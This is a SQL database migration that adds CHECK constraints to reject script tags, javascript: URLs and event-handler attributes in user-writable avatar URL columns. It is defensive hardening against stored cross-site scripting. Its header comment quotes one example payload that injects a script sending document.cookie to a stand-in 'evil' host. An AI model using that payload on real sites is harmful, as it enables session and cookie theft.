-- 022: Defense-in-depth CHECK constraint on avatar_url columns.
--
-- profiles.avatar_url and team_members.avatar_url are user-writable
-- text columns (the row owner self-updates them through migrations
-- 017 + 011's policies — avatar_url is intentionally not on either
-- policy's locked-fields list so the Profile modal can save a new
-- photo).
--
-- The intended value is a Supabase Storage URL like
--   https://<project>.supabase.co/storage/v1/object/public/avatars/<uid>/avatar.jpg
-- written by ProfileView after a successful file upload. But a
-- determined caller can POST any string directly to the Supabase
-- REST endpoint, including a payload like
--   "><script>fetch('//evil/?'+document.cookie)</script>
-- which a future renderer that forgets to escape would execute.
--
-- The render paths today are safe — auth-guard.js uses the DOM API
-- (after the 172f3fa fix) and ProfileView.js uses App.utils.escapeHtml.
-- This migration is the database-side backstop: bad values can't
-- physically land in the columns at all, so even a future rendering
-- regression can't be exploited.
--
-- Mirrors the shape and rationale of notifications_safe_html from
-- migration 017. `not valid` matches that migration's pattern so the
-- constraint protects new writes immediately without scanning the
-- existing rows; run `alter table ... validate constraint ...`
-- manually if you want to confirm legacy rows pass.

alter table public.profiles
  drop constraint if exists profiles_avatar_url_safe;
alter table public.profiles
  add constraint profiles_avatar_url_safe
  check (
    avatar_url is null
    or (
      length(avatar_url) <= 500
      and avatar_url ~ '^https://'
      and avatar_url !~* '<\s*script\b'
      and avatar_url !~* 'javascript\s*:'
      and avatar_url !~* '\son[a-z]+\s*='
    )
  ) not valid;

alter table public.team_members
  drop constraint if exists team_members_avatar_url_safe;
alter table public.team_members
  add constraint team_members_avatar_url_safe
  check (
    avatar_url is null
    or (
      length(avatar_url) <= 500
      and avatar_url ~ '^https://'
      and avatar_url !~* '<\s*script\b'
      and avatar_url !~* 'javascript\s*:'
      and avatar_url !~* '\son[a-z]+\s*='
    )
  ) not valid;
